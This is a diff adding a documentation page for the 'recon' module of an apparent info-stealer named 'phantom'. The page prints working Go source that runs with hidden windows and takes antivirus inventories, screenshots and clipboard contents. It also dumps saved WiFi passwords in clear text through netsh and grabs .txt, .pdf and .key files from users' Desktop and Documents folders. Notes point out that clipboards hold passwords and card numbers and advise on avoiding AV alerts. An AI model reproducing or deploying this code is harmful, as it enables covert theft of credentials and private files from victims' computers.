@@ -1,0 +1,749 @@
+---
+title: "System Reconnaissance"
+description: "Documentation for the recon module - collecting system information, screenshots, network data, and installed software"
+---
+
+## Overview
+
+The `recon` module performs comprehensive system reconnaissance, gathering hardware specs, network configuration, security software, screenshots, clipboard data, and WiFi passwords.
+
+## Data Structures
+
+### SystemInfo
+
+Main structure containing all collected system information:
+
+```go recon/recon.go:38-57
+type SystemInfo struct {
+    ComputerName  string
+    Username      string
+    OS            string
+    Architecture  string
+    CPUCores      int
+    RAM           string
+    GPU           string
+    Disks         []DiskInfo
+    Network       []NetworkInfo
+    PublicIP      string
+    GeoIP         string
+    Uptime        string
+    AntiVirus     []string
+    InstalledApps []string
+    RunningProcs  []string
+    Screenshot    []byte
+    ClipboardData string
+    WifiPasswords []WifiPassword
+}
+```
+
+### DiskInfo
+
+```go recon/recon.go:59-64
+type DiskInfo struct {
+    Drive      string
+    TotalSpace uint64
+    FreeSpace  uint64
+    FileSystem string
+}
+```
+
+### NetworkInfo
+
+```go recon/recon.go:66-71
+type NetworkInfo struct {
+    Interface string
+    IP        string
+    MAC       string
+    Gateway   string
+}
+```
+
+### WifiPassword
+
+```go recon/recon.go:73-76
+type WifiPassword struct {
+    SSID     string
+    Password string
+}
+```
+
+## Main Collection Function
+
+### Collect()
+
+Gathers all system information:
+
+```go recon/recon.go:116-167
+func Collect() *SystemInfo {
+    info := &SystemInfo{}
+
+    // basic stuff first - these are fast
+    info.ComputerName, _ = os.Hostname()
+    info.Username = os.Getenv("USERNAME")
+    info.OS = runtime.GOOS
+    info.Architecture = runtime.GOARCH
+    info.CPUCores = runtime.NumCPU()
+
+    // memory info
+    memStatus, _ := syscalls.GetMemoryStatus()
+    if memStatus != nil {
+        info.RAM = formatBytes(memStatus.TotalPhys)
+    }
+
+    // GPU - uses WMI which is slow but works
+    info.GPU = getGPU()
+
+    // disk info - all drives
+    info.Disks = getDisks()
+
+    // network interfaces + IPs
+    info.Network = getNetworkInfo()
+    info.PublicIP = getPublicIP()
+
+    // system uptime
+    uptime := syscalls.GetTickCount64()
+    info.Uptime = formatDuration(time.Duration(uptime) * time.Millisecond)
+
+    // detect AV software
+    info.AntiVirus = getAntiVirus()
+
+    // installed programs
+    info.InstalledApps = getInstalledApps()
+
+    // running processes
+    info.RunningProcs, _ = syscalls.EnumProcesses()
+
+    // take a screenshot
+    info.Screenshot = takeScreenshot()
+
+    // grab clipboard
+    info.ClipboardData = getClipboard()
+
+    // wifi passwords
+    info.WifiPasswords = getWifiPasswords()
+
+    return info
+}
+```
+
+## Hardware Information
+
+### GPU Detection
+
+Uses WMI to query GPU information:
+
+```go recon/recon.go:171-188
+func getGPU() string {
+    cmd := exec.Command("wmic", "path", "win32_videocontroller", "get", "name")
+    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+    output, err := cmd.Output()
+    if err != nil {
+        return "Unknown"
+    }
+
+    lines := strings.Split(string(output), "\n")
+    for _, line := range lines {
+        line = strings.TrimSpace(line)
+        if line != "" && line != "Name" {
+            return line
+        }
+    }
+
+    return "Unknown"
+}
+```
+
+<Note>
+WMI (Windows Management Instrumentation) queries can be slow but provide accurate hardware information.
+</Note>
+
+### Disk Enumeration
+
+Iterates through all drive letters to find mounted disks:
+
+```go recon/recon.go:190-217
+func getDisks() []DiskInfo {
+    var disks []DiskInfo
+
+    for _, drive := range "CDEFGHIJKLMNOPQRSTUVWXYZ" {
+        drivePath := string(drive) + ":\\">
+
+        h := kernel32.NewProc("GetDiskFreeSpaceExW")
+        var freeBytesAvailable, totalBytes, totalFreeBytes uint64
+
+        drivePtr, _ := syscall.UTF16PtrFromString(drivePath)
+        ret, _, _ := h.Call(
+            uintptr(unsafe.Pointer(drivePtr)),
+            uintptr(unsafe.Pointer(&freeBytesAvailable)),
+            uintptr(unsafe.Pointer(&totalBytes)),
+            uintptr(unsafe.Pointer(&totalFreeBytes)),
+        )
+
+        if ret != 0 {
+            disks = append(disks, DiskInfo{
+                Drive:      drivePath,
+                TotalSpace: totalBytes,
+                FreeSpace:  totalFreeBytes,
+            })
+        }
+    }
+
+    return disks
+}
+```
+
+## Network Information
+
+### Local Network Interfaces
+
+```go recon/recon.go:219-251
+func getNetworkInfo() []NetworkInfo {
+    var networks []NetworkInfo
+
+    interfaces, err := net.Interfaces()
+    if err != nil {
+        return networks
+    }
+
+    for _, iface := range interfaces {
+        if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
+            continue
+        }
+
+        addrs, err := iface.Addrs()
+        if err != nil {
+            continue
+        }
+
+        for _, addr := range addrs {
+            if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
+                if ipnet.IP.To4() != nil {
+                    networks = append(networks, NetworkInfo{
+                        Interface: iface.Name,
+                        IP:        ipnet.IP.String(),
+                        MAC:       iface.HardwareAddr.String(),
+                    })
+                }
+            }
+        }
+    }
+
+    return networks
+}
+```
+
+### Public IP Detection
+
+Uses free IP lookup services:
+
+```go recon/recon.go:253-271
+func getPublicIP() string {
+    // using multiple free services for reliability
+    services := []string{
+        "https://api.ipify.org",
+        "https://icanhazip.com",
+        "https://ifconfig.me/ip",
+    }
+
+    for _, service := range services {
+        cmd := exec.Command("powershell", "-Command", 
+            fmt.Sprintf("(Invoke-WebRequest -Uri '%s' -UseBasicParsing).Content", service))
+        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+        output, err := cmd.Output()
+        if err == nil {
+            return strings.TrimSpace(string(output))
+        }
+    }
+
+    return "Unknown"
+}
+```
+
+<Accordion title="Public IP Services">
+- **api.ipify.org** - Simple API returning plain text IP
+- **icanhazip.com** - Returns IP address only
+- **ifconfig.me/ip** - Returns public IP
+
+Multiple services ensure reliability if one is down.
+</Accordion>
+
+## Security Software Detection
+
+### Antivirus Enumeration
+
+Queries Windows Security Center via WMI:
+
+```go recon/recon.go:273-292
+func getAntiVirus() []string {
+    var avList []string
+
+    cmd := exec.Command("wmic", "/namespace:\\\\root\\securitycenter2", 
+        "path", "antivirusproduct", "get", "displayname")
+    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+    output, err := cmd.Output()
+    if err != nil {
+        return avList
+    }
+
+    lines := strings.Split(string(output), "\n")
+    for _, line := range lines {
+        line = strings.TrimSpace(line)
+        if line != "" && line != "displayName" {
+            avList = append(avList, line)
+        }
+    }
+
+    return avList
+}
+```
+
+<Note>
+Windows Security Center tracks all registered AV products. This includes Windows Defender and third-party solutions.
+</Note>
+
+### Installed Applications
+
+```go recon/recon.go:294-313
+func getInstalledApps() []string {
+    var apps []string
+
+    cmd := exec.Command("wmic", "product", "get", "name")
+    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+    output, err := cmd.Output()
+    if err != nil {
+        return apps
+    }
+
+    lines := strings.Split(string(output), "\n")
+    for _, line := range lines {
+        line = strings.TrimSpace(line)
+        if line != "" && line != "Name" {
+            apps = append(apps, line)
+        }
+    }
+
+    return apps
+}
+```
+
+<Warning>
+`wmic product` can be slow and may trigger AV alerts. Use sparingly.
+</Warning>
+
+## Screenshot Capture
+
+### takeScreenshot()
+
+Captures desktop screenshot using GDI:
+
+```go recon/recon.go:315-397
+func takeScreenshot() []byte {
+    width, _, _ := procGetSystemMetrics.Call(SM_CXSCREEN)
+    height, _, _ := procGetSystemMetrics.Call(SM_CYSCREEN)
+
+    if width == 0 || height == 0 {
+        return nil
+    }
+
+    hdcScreen, _, _ := procGetDC.Call(0)
+    if hdcScreen == 0 {
+        return nil
+    }
+    defer procReleaseDC.Call(0, hdcScreen)
+
+    hdcMem, _, _ := procCreateCompatibleDC.Call(hdcScreen)
+    if hdcMem == 0 {
+        return nil
+    }
+    defer procDeleteDC.Call(hdcMem)
+
+    hBitmap, _, _ := procCreateCompatibleBitmap.Call(hdcScreen, width, height)
+    if hBitmap == 0 {
+        return nil
+    }
+    defer procDeleteObject.Call(hBitmap)
+
+    procSelectObject.Call(hdcMem, hBitmap)
+    procBitBlt.Call(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY)
+
+    // get bitmap data
+    type BITMAPINFOHEADER struct {
+        BiSize          uint32
+        BiWidth         int32
+        BiHeight        int32
+        BiPlanes        uint16
+        BiBitCount      uint16
+        BiCompression   uint32
+        BiSizeImage     uint32
+        BiXPelsPerMeter int32
+        BiYPelsPerMeter int32
+        BiClrUsed       uint32
+        BiClrImportant  uint32
+    }
+
+    bmi := BITMAPINFOHEADER{
+        BiSize:        40,
+        BiWidth:       int32(width),
+        BiHeight:      -int32(height), // top-down
+        BiPlanes:      1,
+        BiBitCount:    32,
+        BiCompression: BI_RGB,
+    }
+
+    imageSize := int(width) * int(height) * 4
+    pixels := make([]byte, imageSize)
+
+    procGetDIBits.Call(
+        hdcMem,
+        hBitmap,
+        0,
+        height,
+        uintptr(unsafe.Pointer(&pixels[0])),
+        uintptr(unsafe.Pointer(&bmi)),
+        0,
+    )
+
+    // convert BGRA to RGBA
+    for i := 0; i < len(pixels); i += 4 {
+        pixels[i], pixels[i+2] = pixels[i+2], pixels[i]
+    }
+
+    // create image
+    img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
+    copy(img.Pix, pixels)
+
+    // encode to PNG
+    var buf bytes.Buffer
+    if err := png.Encode(&buf, img); err != nil {
+        return nil
+    }
+
+    return buf.Bytes()
+}
+```
+
+<Accordion title="GDI Screenshot Process">
+1. **Get screen dimensions** - `GetSystemMetrics(SM_CXSCREEN/SM_CYSCREEN)`
+2. **Get screen DC** - `GetDC(NULL)` for desktop device context
+3. **Create memory DC** - `CreateCompatibleDC()` for off-screen rendering
+4. **Create bitmap** - `CreateCompatibleBitmap()` matching screen size
+5. **Select bitmap** - `SelectObject()` into memory DC
+6. **Copy pixels** - `BitBlt()` from screen to memory bitmap
+7. **Extract bits** - `GetDIBits()` to get raw pixel data
+8. **Convert format** - BGRA to RGBA color space
+9. **Encode PNG** - Use Go's png encoder
+</Accordion>
+
+## Clipboard Data
+
+### getClipboard()
+
+Retrieves current clipboard text:
+
+```go recon/recon.go:399-428
+func getClipboard() string {
+    ret, _, _ := procOpenClipboard.Call(0)
+    if ret == 0 {
+        return ""
+    }
+    defer procCloseClipboard.Call()
+
+    h, _, _ := procGetClipboardData.Call(CF_TEXT)
+    if h == 0 {
+        return ""
+    }
+
+    ptr, _, _ := procGlobalLock.Call(h)
+    if ptr == 0 {
+        return ""
+    }
+    defer procGlobalUnlock.Call(h)
+
+    // read null-terminated string
+    data := (*[1 << 20]byte)(unsafe.Pointer(ptr))
+    var text []byte
+    for i := 0; i < len(data); i++ {
+        if data[i] == 0 {
+            break
+        }
+        text = append(text, data[i])
+    }
+
+    return string(text)
+}
+```
+
+<Note>
+Clipboard often contains passwords, credit card numbers, or cryptocurrency addresses that users have copied.
+</Note>
+
+## WiFi Password Extraction
+
+### getWifiPasswords()
+
+Uses `netsh` to extract saved WiFi passwords:
+
+```go recon/recon.go:430-477
+func getWifiPasswords() []WifiPassword {
+    var passwords []WifiPassword
+
+    // get all wifi profiles
+    cmd := exec.Command("netsh", "wlan", "show", "profiles")
+    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+    output, err := cmd.Output()
+    if err != nil {
+        return passwords
+    }
+
+    lines := strings.Split(string(output), "\n")
+    for _, line := range lines {
+        if strings.Contains(line, "All User Profile") || strings.Contains(line, "Profil") {
+            parts := strings.Split(line, ":")
+            if len(parts) >= 2 {
+                ssid := strings.TrimSpace(parts[1])
+                if ssid == "" {
+                    continue
+                }
+
+                // get password for this profile
+                cmd := exec.Command("netsh", "wlan", "show", "profile", ssid, "key=clear")
+                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+                output, err := cmd.Output()
+                if err != nil {
+                    continue
+                }
+
+                profileLines := strings.Split(string(output), "\n")
+                for _, profileLine := range profileLines {
+                    if strings.Contains(profileLine, "Key Content") || strings.Contains(profileLine, "Contenu") {
+                        parts := strings.Split(profileLine, ":")
+                        if len(parts) >= 2 {
+                            password := strings.TrimSpace(parts[1])
+                            passwords = append(passwords, WifiPassword{
+                                SSID:     ssid,
+                                Password: password,
+                            })
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    return passwords
+}
+```
+
+<Accordion title="netsh WiFi Commands">
+**List all profiles:**
+```bash
+netsh wlan show profiles
+```
+
+**Show specific profile with password:**
+```bash
+netsh wlan show profile "WiFi Name" key=clear
+```
+
+**Output format:**
+```
+Key Content            : MyPassword123
+```
+
+Supports both English and French Windows ("Key Content" vs "Contenu de la clé").
+</Accordion>
+
+<Note>
+WiFi password extraction works without admin privileges for user-saved networks.
+</Note>
+
+## File Grabber
+
+### GrabFiles()
+
+Grabs specific file types from user directories:
+
+```go recon/recon.go:503-548
+func GrabFiles(extensions []string, maxSize int64, paths []string) []GrabbedFile {
+    var files []GrabbedFile
+    userProfile := os.Getenv("USERPROFILE")
+
+    for _, path := range paths {
+        fullPath := filepath.Join(userProfile, path)
+        if _, err := os.Stat(fullPath); os.IsNotExist(err) {
+            continue
+        }
+
+        filepath.Walk(fullPath, func(p string, info os.FileInfo, err error) error {
+            if err != nil {
+                return nil
+            }
+
+            if info.IsDir() {
+                return nil
+            }
+
+            if info.Size() > maxSize {
+                return nil
+            }
+
+            ext := strings.ToLower(filepath.Ext(info.Name()))
+            for _, targetExt := range extensions {
+                if ext == targetExt {
+                    content, err := os.ReadFile(p)
+                    if err != nil {
+                        return nil
+                    }
+
+                    relPath, _ := filepath.Rel(userProfile, p)
+                    files = append(files, GrabbedFile{
+                        Path:    relPath,
+                        Content: content,
+                    })
+                    break
+                }
+            }
+
+            return nil
+        })
+    }
+
+    return files
+}
+```
+
+<ParamField path="extensions" type="[]string">
+  File extensions to grab (e.g., `[".txt", ".pdf", ".key"]`)
+</ParamField>
+
+<ParamField path="maxSize" type="int64">
+  Maximum file size in bytes (avoid huge files)
+</ParamField>
+
+<ParamField path="paths" type="[]string">
+  Directories to search (relative to user profile)
+</ParamField>
+
+### GrabbedFile
+
+```go recon/recon.go:550-553
+type GrabbedFile struct {
+    Path    string
+    Content []byte
+}
+```
+
+## Helper Functions
+
+### formatBytes()
+
+Formats bytes into human-readable units:
+
+```go recon/recon.go:479-490
+func formatBytes(b uint64) string {
+    const unit = 1024
+    if b < unit {
+        return fmt.Sprintf("%d B", b)
+    }
+    div, exp := uint64(unit), 0
+    for n := b / unit; n >= unit; n /= unit {
+        div *= unit
+        exp++
+    }
+    return fmt.Sprintf("%.1f %cB", float64(b)/float64(div), "KMGTPE"[exp])
+}
+```
+
+### formatDuration()
+
+Formats uptime into readable format:
+
+```go recon/recon.go:492-500
+func formatDuration(d time.Duration) string {
+    days := d / (24 * time.Hour)
+    d -= days * 24 * time.Hour
+    hours := d / time.Hour
+    d -= hours * time.Hour
+    minutes := d / time.Minute
+
+    return fmt.Sprintf("%dd %dh %dm", days, hours, minutes)
+}
+```
+
+### EncodeScreenshot()
+
+Encodes screenshot to base64:
+
+```go recon/recon.go:556-558
+func EncodeScreenshot(data []byte) string {
+    return base64.StdEncoding.EncodeToString(data)
+}
+```
+
+## Win32 API Constants
+
+```go recon/recon.go:107-113
+const (
+    SM_CXSCREEN = 0          // screen width
+    SM_CYSCREEN = 1          // screen height
+    SRCCOPY     = 0x00CC0020 // bitblt raster op
+    CF_TEXT     = 1          // clipboard text format
+    BI_RGB      = 0          // uncompressed bitmap
+)
+```
+
+## Usage Example
+
+```go
+import "phantom/recon"
+
+func main() {
+    // Collect all system information
+    sysInfo := recon.Collect()
+
+    // Access collected data
+    fmt.Printf("Computer: %s\\%s\n", sysInfo.ComputerName, sysInfo.Username)
+    fmt.Printf("OS: %s %s\n", sysInfo.OS, sysInfo.Architecture)
+    fmt.Printf("RAM: %s\n", sysInfo.RAM)
+    fmt.Printf("GPU: %s\n", sysInfo.GPU)
+    fmt.Printf("Public IP: %s\n", sysInfo.PublicIP)
+    fmt.Printf("Antivirus: %v\n", sysInfo.AntiVirus)
+
+    // Save screenshot
+    if sysInfo.Screenshot != nil {
+        os.WriteFile("screenshot.png", sysInfo.Screenshot, 0644)
+    }
+
+    // Print WiFi passwords
+    for _, wifi := range sysInfo.WifiPasswords {
+        fmt.Printf("SSID: %s, Password: %s\n", wifi.SSID, wifi.Password)
+    }
+
+    // Grab specific files
+    files := recon.GrabFiles(
+        []string{".txt", ".pdf", ".key"},
+        5*1024*1024, // 5MB max
+        []string{"Desktop", "Documents"},
+    )
+    fmt.Printf("Grabbed %d files\n", len(files))
+}
+```
+
+## Performance Considerations
+
+<Warning>
+**Slow operations:**
+- WMI queries (GPU, AV, installed apps) - can take 1-5 seconds each
+- Screenshot capture - depends on resolution
+- File grabber - depends on file count
+
+Consider running slow operations in goroutines for parallel execution.
+</Warning>
+
+<Note>
+**Fast operations:**
+- Basic system info (hostname, username, OS)
+- CPU core count
+- Network interfaces
+- Clipboard data
+</Note>
